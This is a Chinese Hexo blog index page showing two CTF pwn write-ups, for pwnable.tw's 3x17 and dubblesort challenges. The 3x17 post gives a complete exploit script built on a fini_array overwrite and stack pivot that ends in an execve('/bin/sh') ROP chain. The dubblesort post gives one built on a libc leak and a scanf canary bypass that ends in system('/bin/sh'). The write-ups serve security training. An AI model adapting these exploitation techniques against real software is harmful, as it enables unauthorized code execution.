<!DOCTYPE html>
<html lang="zh-Hans">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="zraxx" />


    
    


<meta property="og:type" content="website">
<meta property="og:title" content="从零开始的博客">
<meta property="og:url" content="https://zrax-x.github.io/index.html">
<meta property="og:site_name" content="从零开始的博客">
<meta property="article:author" content="zraxx">
<meta name="twitter:card" content="summary">

<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="从零开始的博客" type="application/atom+xml">



    <link rel="shortcut icon" href="/img/head.jpg">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">



<link rel="stylesheet" href="/css/style.css">



    <style> .article { opacity: 0;} </style>


<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>从零开始的博客</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: true,
        isPost: false,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: false
    }
</script>


    <script> yiliaConfig.jquery_ui = [false]; </script>



    <script> yiliaConfig.rootUrl = "\/";</script>



    <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e99709bc8a01e43"></script>




<meta name="generator" content="Hexo 4.2.0"></head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/head.jpg" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">zraxx</a></h1>
        </hgroup>

        

        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">关于我</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="/214920976@qq.com" title="Email"></a>
                            
                                <a class="fa GitHub" href="#" title="GitHub"></a>
                            
                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AES/" rel="tag">AES</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF-%E5%AF%86%E7%A0%81%E5%AD%A6-LLL/" rel="tag">CTF - 密码学 - LLL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ECC/" rel="tag">ECC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ECDH/" rel="tag">ECDH</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Flask/" rel="tag">Flask</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hook/" rel="tag">Hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFSR/" rel="tag">LFSR</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MOV-attack/" rel="tag">MOV attack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/" rel="tag">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB/" rel="tag">WEB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/flask/" rel="tag">flask</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/socket/" rel="tag">socket</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unicode%E6%AC%BA%E9%AA%97/" rel="tag">unicode欺骗</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vlun/" rel="tag">vlun</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>
                    
                    </div>
                </section>
                

                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">zraxx</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/head.jpg" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">zraxx</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">关于我</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="/214920976@qq.com" title="Email"></a>
                            
                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
                            
                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
</nav>
      <div class="body-wrap">
  
    <article id="post-pwnable_3x17" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/25/pwnable_3x17/" class="article-date">
      <time datetime="2020-10-26T06:15:19.752Z" itemprop="datePublished">2020-10-25</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/25/pwnable_3x17/">pwnable_3x17</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="知识点1"><a href="#知识点1" class="headerlink" title="知识点1"></a>知识点1</h3><p>熟悉start函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401A50                 public start</span><br><span class="line">.text:0000000000401A50 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000401A50 ; __unwind &#123;</span><br><span class="line">.text:0000000000401A50                 xor     ebp, ebp</span><br><span class="line">.text:0000000000401A52                 mov     r9, rdx</span><br><span class="line">.text:0000000000401A55                 pop     rsi</span><br><span class="line">.text:0000000000401A56                 mov     rdx, rsp</span><br><span class="line">.text:0000000000401A59                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:0000000000401A5D                 push    rax</span><br><span class="line">.text:0000000000401A5E                 push    rsp</span><br><span class="line">.text:0000000000401A5F                 mov     r8, offset sub_402960</span><br><span class="line">.text:0000000000401A66                 mov     rcx, offset loc_4028D0</span><br><span class="line">.text:0000000000401A6D                 mov     rdi, offset sub_401B6D</span><br><span class="line">.text:0000000000401A74                 db      67h</span><br><span class="line">.text:0000000000401A74                 call    sub_401EB0</span><br><span class="line">.text:0000000000401A7A                 hlt</span><br><span class="line">.text:0000000000401A7A ; &#125; &#x2F;&#x2F; starts at 401A50</span><br><span class="line">.text:0000000000401A7A start           endp</span><br></pre></td></tr></table></figure>
<p>对应于有符号的start函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400890 _start          proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000400890 ; __unwind &#123;</span><br><span class="line">.text:0000000000400890                 xor     ebp, ebp</span><br><span class="line">.text:0000000000400892                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:0000000000400895                 pop     rsi             ; argc</span><br><span class="line">.text:0000000000400896                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:0000000000400899                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:000000000040089D                 push    rax</span><br><span class="line">.text:000000000040089E                 push    rsp             ; stack_end</span><br><span class="line">.text:000000000040089F                 mov     r8, offset __libc_csu_fini ; fini</span><br><span class="line">.text:00000000004008A6                 mov     rcx, offset __libc_csu_init ; init</span><br><span class="line">.text:00000000004008AD                 mov     rdi, offset main ; main</span><br><span class="line">.text:00000000004008B4                 call    __libc_start_main</span><br><span class="line">.text:00000000004008B4 _start          endp</span><br></pre></td></tr></table></figure>
<p>不难发现，r8寄存器中存放的是__libc_csu_fini函数地址，rcx中存访的是__libc_csu_init，rdi中存放main。其函数声明如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __libc_start_main(<span class="keyword">int</span> (main) (<span class="keyword">int</span>, <span class="keyword">char</span> , <span class="keyword">char</span> ), <span class="keyword">int</span> argc, <span class="keyword">char</span> * ubp_av, <span class="keyword">void</span> (init) (<span class="keyword">void</span>), <span class="keyword">void</span> (*fini) (<span class="keyword">void</span>), <span class="keyword">void</span> (*rtld_fini) (<span class="keyword">void</span>), <span class="keyword">void</span> ( stack_end));</span><br></pre></td></tr></table></figure>
<h3 id="知识点二"><a href="#知识点二" class="headerlink" title="知识点二"></a>知识点二</h3><p>start函数流程</p>
<p>start -&gt; _libc_start_main -&gt; libc_csu_init(init_array) -&gt; main -&gt; libc_csu_finit(fini_array) -&gt; exit(main_ret) </p>
<p>这里要注意的是，<code>_init_array</code>执行顺序是下标由小到大，<code>_fini_array</code>执行顺序是下标由大到小。 </p>
<p>因此可以画为</p>
<ul>
<li>.init</li>
<li>.init_array[0]</li>
<li>.init_array[1]</li>
<li>…</li>
<li>.init_array[n]</li>
<li>main</li>
<li>.fini_array[n]</li>
<li>…</li>
<li>.fini_array[1]</li>
<li>.fini_array[0]</li>
<li>.fini</li>
</ul>
<h3 id="知识点三"><a href="#知识点三" class="headerlink" title="知识点三"></a>知识点三</h3><p>改fini_array使程序循环执行main函数</p>
<p>这里的操作是将fini_array[1]改为main函数首地址，fini_array[0]则改为libc_csu_finit函数首地址。这样程序在执行玩main后会执行libc_csu_finit，其中libc_csu_finit函数会首先执行main，然后又是执行libc_csu_finit函数。因此，会陷入死循环。</p>
<h3 id="知识点四"><a href="#知识点四" class="headerlink" title="知识点四"></a>知识点四</h3><p>栈迁移</p>
<p>这里的栈迁移需要观察libc_csu_finit函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000402960 sub_402960      proc near               ; DATA XREF: start+F↑o</span><br><span class="line">.text:0000000000402960 ; __unwind &#123;</span><br><span class="line">.text:0000000000402960                 push    rbp</span><br><span class="line">.text:0000000000402961                 lea     rax, unk_4B4100</span><br><span class="line">.text:0000000000402968                 lea     rbp, off_4B40F0 ; fini_array</span><br><span class="line">.text:000000000040296F                 push    rbx</span><br><span class="line">.text:0000000000402970                 sub     rax, rbp</span><br><span class="line">.text:0000000000402973                 sub     rsp, 8</span><br><span class="line">.text:0000000000402977                 sar     rax, 3</span><br><span class="line">.text:000000000040297B                 jz      short loc_402996</span><br><span class="line">.text:000000000040297D                 lea     rbx, [rax-1]</span><br><span class="line">.text:0000000000402981                 nop     dword ptr [rax+00000000h]</span><br><span class="line">.text:0000000000402988</span><br><span class="line">.text:0000000000402988 loc_402988:                             ; CODE XREF: sub_402960+34↓j</span><br><span class="line">.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0] ; 调用fini_array的函数</span><br><span class="line">.text:000000000040298C                 sub     rbx, 1</span><br><span class="line">.text:0000000000402990                 cmp     rbx, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text:0000000000402994                 jnz     short loc_402988</span><br><span class="line">.text:0000000000402996</span><br><span class="line">.text:0000000000402996 loc_402996:                             ; CODE XREF: sub_402960+1B↑j</span><br><span class="line">.text:0000000000402996                 add     rsp, 8</span><br><span class="line">.text:000000000040299A                 pop     rbx</span><br><span class="line">.text:000000000040299B                 pop     rbp</span><br><span class="line">.text:000000000040299C                 jmp     sub_48E32C</span><br><span class="line">.text:000000000040299C ; &#125; &#x2F;&#x2F; starts at 402960</span><br><span class="line">.text:000000000040299C sub_402960      endp</span><br></pre></td></tr></table></figure>
<p>对照glibc源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__libc_csu_fini (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LIBC_NONSHARED</span></span><br><span class="line">  <span class="keyword">size_t</span> i = __fini_array_end - __fini_array_start;</span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    (*__fini_array_start [i]) ();</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifndef</span> NO_INITFINI</span></span><br><span class="line">  _fini ();</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>仔细观察可以发现，程序一开始会执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000402960 ; __unwind &#123;</span><br><span class="line">.text:0000000000402960                 push    rbp</span><br><span class="line">.text:0000000000402961                 lea     rax, unk_4B4100</span><br><span class="line">.text:0000000000402968                 lea     rbp, off_4B40F0 ; fini_array</span><br></pre></td></tr></table></figure>
<p>然后会调用fini_array中函数，最后返回libc_csu_finit，并将原rbp弹出（即恢复rbp）</p>
<p>所以这里我们在fini_array中可以进行栈迁移，例如我们将fini_array[0]对应的函数改为如下汇编</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401C4B                 leave</span><br><span class="line">.text:0000000000401C4C                 retn</span><br></pre></td></tr></table></figure>
<p>其中leave对应</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov     rsp,rbp</span><br><span class="line">pop     rbp</span><br></pre></td></tr></table></figure>
<p>在执行mov rsp,rbp时，由于rbp为0x4B40F0，因此rsp也会变为0x4B40F0。然后执行pop rbp，此时rsp为0x4B40F8，因此rip就会变为内存0x4B4108上的值，并跳转进行执行，此时rsp为0x4B4100。这里0x4B4108即为fini_array[1]，我们将fini_array[1]改写为main后保持不变，而将fini_array[0]，即0x4B40F0改为leave; ret。这样，完成栈迁移后会首先执行main函数，但这无关紧要，因为main函数执行完后会恢复堆栈，即执行完main后rsp仍然在0x4B4100，就可以开始我们的rop了。</p>
<h3 id="知识点五"><a href="#知识点五" class="headerlink" title="知识点五"></a>知识点五</h3><p>rop构造execve(“/bin/sh”)</p>
<p>查看x86-64下的系统调用，可知需要设置寄存器为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax&#x3D;0x3b</span><br><span class="line">rdi&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;字符串的地址</span><br><span class="line">rsi&#x3D;0</span><br><span class="line">rdx&#x3D;0</span><br></pre></td></tr></table></figure>
<p>最终构造出完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_</span><span class="params">(addr, data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"addr:"</span>)</span><br><span class="line">    p.send(str(addr))</span><br><span class="line">    p.recvuntil(<span class="string">'data:'</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x000000000044a30a : pop rsi ; ret</span></span><br><span class="line"><span class="string">0x000000000047e5d6 : pop rax ; pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000401696 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000471db5 : syscall ; ret</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># stack layout</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x4b4100 0x44a30a</span></span><br><span class="line"><span class="string">0x4b4108 0</span></span><br><span class="line"><span class="string">0x4b4110 0x47e5d6</span></span><br><span class="line"><span class="string">0x4b4118 0x3b</span></span><br><span class="line"><span class="string">0x4b4120 0</span></span><br><span class="line"><span class="string">0x4b4128 '/bin/sh\x00'</span></span><br><span class="line"><span class="string">0x4b4130 0x401696</span></span><br><span class="line"><span class="string">0x4b4138 0x4b4128 (addr of 'bin/sh\x00')</span></span><br><span class="line"><span class="string">0x4b4138 0x471db5</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x401C4B</span></span><br><span class="line">libc_csu_fini = <span class="number">0x402960</span></span><br><span class="line">main = <span class="number">0x401B6D</span></span><br><span class="line"></span><br><span class="line">send_(<span class="number">0x4B40F0</span>, p64(libc_csu_fini)+p64(main))</span><br><span class="line">send_(<span class="number">0x4B40F0</span> + <span class="number">0x10</span>, p64(<span class="number">0x44a30a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x47e5d6</span>))</span><br><span class="line">send_(<span class="number">0x4B40F0</span> + <span class="number">0x10</span> + <span class="number">0x18</span>, p64(<span class="number">0x3b</span>) + p64(<span class="number">0</span>) + <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">send_(<span class="number">0x4B40F0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span>, p64(<span class="number">0x401696</span>) + p64(<span class="number">0x4b4128</span>) + p64(<span class="number">0x471db5</span>))</span><br><span class="line">send_(<span class="number">0x4B40F0</span>, p64(leave_ret))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-pwnable_dubblesort" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/23/pwnable_dubblesort/" class="article-date">
      <time datetime="2020-10-23T07:00:00.000Z" itemprop="datePublished">2020-10-23</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/23/pwnable_dubblesort/">pwnable.tw dubblesort</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p> 查看逻辑，发现主要为冒泡排序。漏洞点为两个，第一个比较明显，就是在输入数字的时候存在栈溢出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf((<span class="keyword">int</span>)<span class="string">"%u"</span>, (<span class="keyword">int</span>)&amp;v12);</span><br><span class="line">v3 = v12;</span><br><span class="line"><span class="keyword">if</span> ( v12 )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = &amp;v13;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"Enter the %d number : "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf((<span class="keyword">int</span>)<span class="string">"%u"</span>, (<span class="keyword">int</span>)v4);</span><br><span class="line">    ++v5;</span><br><span class="line">    v3 = v12;</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v12 &gt; v5 );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第二点比较隐蔽，在输入name后，程序会打印name，但是这里就存在泄露。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"What your name :"</span>);</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">__printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"Hello %s,How many numbers do you what to sort :"</span>);</span><br></pre></td></tr></table></figure>
<p>因为read时不会给buf带上\x00，因此就会泄露栈上的后续地址的内容。通过调试，可以看到在输入的字符串后的第25个字节开始就是和libc地址有关的信息</p>
<p><img src="/2020/10/23/pwnable_dubblesort/Users\msi1\AppData\Local\Temp\1603693654936.png" alt="1603693654936"></p>
<p>同时通过查看vmmap可以计算出两者的地址偏移值为0x1b0000</p>
<p><img src="/2020/10/23/pwnable_dubblesort/Users\msi1\AppData\Local\Temp\1603693801036.png" alt="1603693801036"></p>
<p>有了libc基址后我们就可以愉快的计算出system和/bin/sh的地址，完成rop。</p>
<p>但是查看程序开启的保护，发现有canary，这导致栈溢出无法进行，因为我们不知道栈上的magic num值。于是这里需要一个技巧（网上查到的）</p>
<h3 id="scanf中的一个机制"><a href="#scanf中的一个机制" class="headerlink" title="scanf中的一个机制"></a>scanf中的一个机制</h3><p>当我们输入+或者-号时程序会读取成功，但同时不会对变量值进行赋值，这样就能保证在对magic_num进行赋值时我们可以保持原来的值不变就能成功绕过canary保护。</p>
<p>最后在进行rop的时候由于有canary，可能并不是很清楚我们需要溢出多少个字节，这时候我们可以借助gdb调试功能进行计算或者直接利用反汇编代码查看main函数的esp指针变化情况。</p>
<p>最终完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">"name :"</span>, <span class="string">"A"</span>*(<span class="number">4</span>*<span class="number">6</span>))</span><br><span class="line">p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">addr = u32(p.recv(<span class="number">3</span>).rjust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line"></span><br><span class="line">libc_base = addr - <span class="number">0x1b0000</span></span><br><span class="line">addr_system = libc_base + <span class="number">0x3a940</span></span><br><span class="line">addr_shell = libc_base + <span class="number">0x158e8b</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"sort :"</span>, str(<span class="number">6</span>*<span class="number">4</span>+<span class="number">1</span>+<span class="number">7</span>+<span class="number">3</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>*<span class="number">4</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">"number : "</span>, <span class="string">"0"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"number : "</span>, <span class="string">"+"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">"number : "</span>, str(addr_system<span class="number">-1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"number : "</span>, str(addr_system))</span><br><span class="line">p.sendlineafter(<span class="string">"number : "</span>, str(addr_system))</span><br><span class="line">p.sendlineafter(<span class="string">"number : "</span>, str(addr_shell))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-pwnable_calc" class="article article-type-post" itemscope itemprop="blogPost">
  
